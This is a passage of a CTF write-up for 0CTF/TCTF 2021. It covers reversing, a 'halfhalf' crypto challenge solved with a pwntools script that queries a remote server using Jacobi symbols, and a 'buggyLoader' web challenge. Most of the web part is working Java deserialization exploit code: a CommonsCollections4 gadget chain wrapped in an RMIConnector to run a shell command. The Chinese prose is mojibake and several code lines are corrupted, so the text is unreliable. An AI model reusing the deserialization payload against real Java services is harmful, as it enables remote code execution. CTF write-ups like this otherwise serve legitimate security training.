                int[] b = new int[20];
                for (int i = 1; i > 31) >>> 24) & -256))); /* 1908, 591 */
                    int id1891 = (b[5] | b[7]) ^ wtf20;
                    int id1888 = id1891 + b[10] + b[11]; int id1883 = id1888 - ((((id1888 >> 31) >>> 24) + id1888) & -256);
                    int temp1872 = a[0] ^ id1883;
                    for (int j = 0; j > 31) >>> 24)) & -256);
                int id1891 = (a[5] | a[7]) ^ wtf20;
                int id1888 = id1891 + a[10] + a[11];
                int id1883 = id1888 - ((((id1888 >> 31) >>> 24) + id1888) & -256);
                for (int j = 13; j >= 0; j--) {
                    a[j + 1] = a[j];
                }
                a[0] = id1883 ^ id1872;
            }
            for (int i = 0; i > 31) >>> 24) & -256 å…¶å®æ˜¯ sign ï¼Œthanks to liangjs)
###  halfhalf
é€†å‘éƒ¨åˆ†ï¼š
PoWéƒ¨åˆ†éªŒè¯è¾“å…¥çš„å‰å››å­—èŠ‚çš„çš„sha256çš„å3å­—èŠ‚ä¸è¾“å‡ºçš„å†…å®¹ç›¸åŒã€‚
Magic Wordéƒ¨åˆ†å°†è¾“å…¥ç›´æ¥ä¸å¸¸é‡æ¯”å¯¹ï¼Œç›´æ¥æå–å‡ºæ¥å³å¯,ä¸º`ğŸ¶ğŸğŸ³ğŸ ğŸ£ğŸ’€ğŸ’ºğŸ‘ˆğŸ‘‰ğŸğŸ¦…ğŸ”¥ğŸª“ğŸ‘ƒğŸ¶ğŸ“„`ã€‚
ç¨‹åºå…ˆåˆå§‹åŒ–äº†è´¨æ•°på’Œq,å’Œä¸€ä¸ªä¸Šé™`1=v40 `c=(rand()**2)*9*2` å¦åˆ™`c= (rand()**2)*9`ï¼Œç„¶åè¾“å‡º`pow(c,65537,p*q)`
  3. è¾“å‡ºæ—§çš„v40ï¼Œç„¶åé‡æ–°éšæœºç”Ÿæˆä¸€ä¸ªv40
  4. è‹¥è¾“å…¥çš„æ˜¯v40åˆ™è¾“å‡ºflag å¦åˆ™é€€å‡ºç¨‹åº
  5. é€€å‡º
cryptoéƒ¨åˆ†ï¼š
ç”±äº*9å’Œ*9*2æœ€å¤§çš„åŒºåˆ«æ˜¯æ˜¯å¦ä¸ºå¹³æ–¹æ•°ï¼Œé‚£ä¹ˆåœ¨powä¸‹ï¼Œæˆ‘ä»¬è®¡ç®—ä¸€ä¸ªé›…å¯æ¯”ç¬¦å·å°±å¯ä»¥åˆ¤æ–­ä»–å’Œv40çš„å¤§å°ï¼Œä»è€ŒäºŒåˆ†æ³•é€¼è¿‘
    import hashlib,itertools,string
    from pwn import *
    from sympy import *
    import gmpy2
    #context.log_level="debug"
    #io=process("./debug")
    io=remote("121.5.253.92",34567)
    # pass pow
    def pass_pow():
        io.recvuntil(" ")
    io.writeline("1")
    io.recvuntil("ğŸ”’:")
    oo=str(io.readline().strip(),encoding="utf8")
    n=convert_emoji_to_number(oo)
    # get v40 and reset
    io.recvuntil("> ")
    io.writeline("3")
    oo=str(io.readline().strip(),encoding="utf8")
    v40=convert_emoji_to_number(oo)
    print("v40:",v40)
    print("##")
    # io func
    def convert_number_to_emoji(number):
        d="ğŸğŸ³ğŸ¶ğŸğŸ ğŸ£ğŸ¶ğŸ‘ƒğŸ‘ˆğŸ‘‰ğŸ’€ğŸ’ºğŸ“„ğŸ”¥ğŸ¦…ğŸª“"
        result=""
        tmp=number
        while tmp!=0:
            result=d[tmp%16]+result
            tmp=(tmp>>4)
        return result
    def put_up(v40):
        io.recvuntil("> ")
        io.writeline("2")
        io.recvuntil("â”:")
        io.writeline(convert_number_to_emoji(v40))
        checkstr=str(io.readline().strip(),encoding="utf8")
        check_c=convert_emoji_to_number(checkstr)
        #print(v40,convert_number_to_emoji(v40))
        #print(check_c)
        #print(gmpy2.jacobi(check_c,n))
        return gmpy2.jacobi(check_c,n)
    up=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084095
    down=13
    while up-down>1:
        newp=up-((up-down)//2)
        print(newp)
        if put_up(newp)==1:
            up=newp
        else:
            down=newp
    print(up)
    print(down)
    # get v40 and reset
    '''
    io.recvuntil("> ")
    io.writeline("3")
    oo=str(io.readline().strip(),encoding="utf8")
    v40=convert_emoji_to_number(oo)
    print("v40:",v40)
    print("##")'''
    # get flag
    io.recvuntil("> ")
    io.writeline("4")
    io.recvuntil("ğŸ”‘: ")
    io.writeline(convert_number_to_emoji(up))
    io.interactive()
## WEB
###  buggyLoader
é¢˜ç›®éœ€è¦ç»“åˆäºŒæ¬¡ååºåˆ—åŒ–get flagï¼ŒåŒæ—¶åºåˆ—åŒ–çš„æ•°æ®éœ€è¦æ»¡è¶³`IndexController`ç±»ä¸­çš„é™åˆ¶ï¼š
    String name = objectInputStream.readUTF();
    int year = objectInputStream.readInt();
    if (name.equals("0CTF/TCTF") && year == 2021) {
        objectInputStream.readObject();
    }
è¿™é‡Œé€šè¿‡`writeUTF`å’Œ`writeInt`å…ˆåˆ†åˆ«å†™å…¥`0CTF/TCTF`å’Œ`2021`ï¼Œç„¶åå†`writeObject`ï¼š
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oss = null;
    oss = new ObjectOutputStream(bos);
    oss.writeUTF("0CTF/TCTF");
    oss.writeInt(2021);
    oss.writeObject(obj);
    oss.flush();
    byte[] bytes = bos.toByteArray();
    bos.close();
    String hex = Utils.bytesTohexString(bytes);
åºåˆ—åŒ–æ•°æ®çš„æ„é€ ï¼šé¦–å…ˆæ˜¯`MyObjectInputStream`ä¸­`resolveClass`å½±å“äº†é“¾å­çš„æ„é€ ï¼Œæœ€åæ˜¯`cc4`çš„é“¾è°ƒåˆ°`RMIConnector`çš„`connect`è§¦å‘äºŒæ¬¡ååºåˆ—åŒ–ã€‚  
ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼š
    package com.yxxx.buggyLoader;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import ysoserial.payloads.CommonsCollections4;
    import ysoserial.payloads.util.Reflections;
    import javax.management.remote.JMXServiceURL;
    import javax.management.remote.rmi.RMIConnector;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class Exp {
        public static void main(String[] args) throws Exception {
            Object obj = getObject();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oss = null;
            oss = new ObjectOutputStream(bos);
            oss.writeUTF("0CTF/TCTF");
            oss.writeInt(2021);
            oss.writeObject(obj);
            oss.flush();
            byte[] bytes = bos.toByteArray();
            bos.close();
            String hex = Utils.bytesTohexString(bytes);
            System.out.println(hex);
            byte[] b2 = Utils.hexStringToBytes(hex);
            InputStream inputStream1 = new ByteArrayInputStream(b2);
            ObjectInputStream objectInputStream1 = new MyObjectInputStream(inputStream1);
            Object obj2 = objectInputStream1.readObject();
        }
        public static Serializable getObject() throws Exception {
            Transformer transformer = InvokerTransformer.getInstance("connect");
            CommonsCollections4 commonsCollections3 = new CommonsCollections4();
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(commonsCollections3.getObject("touch /tmp/success"));
            String expbase64 = new String(Base64.getEncoder().encode(outputStream.toByteArray()));
            String finalExp = "service:jmx:rmi:///stub/" + expbase64;
            RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL(finalExp), new HashMap<>());
            Map innerMap = new HashMap();
            Map lazyMap = LazyMap.decorate(innerMap, transformer);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, rmiConnector);
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException var18) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            Reflections.setAccessible(f);
            HashMap innimpl = (HashMap) f.get(map);
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException var17) {
                f2 = HashMap.class.getDeclaredField("elementData");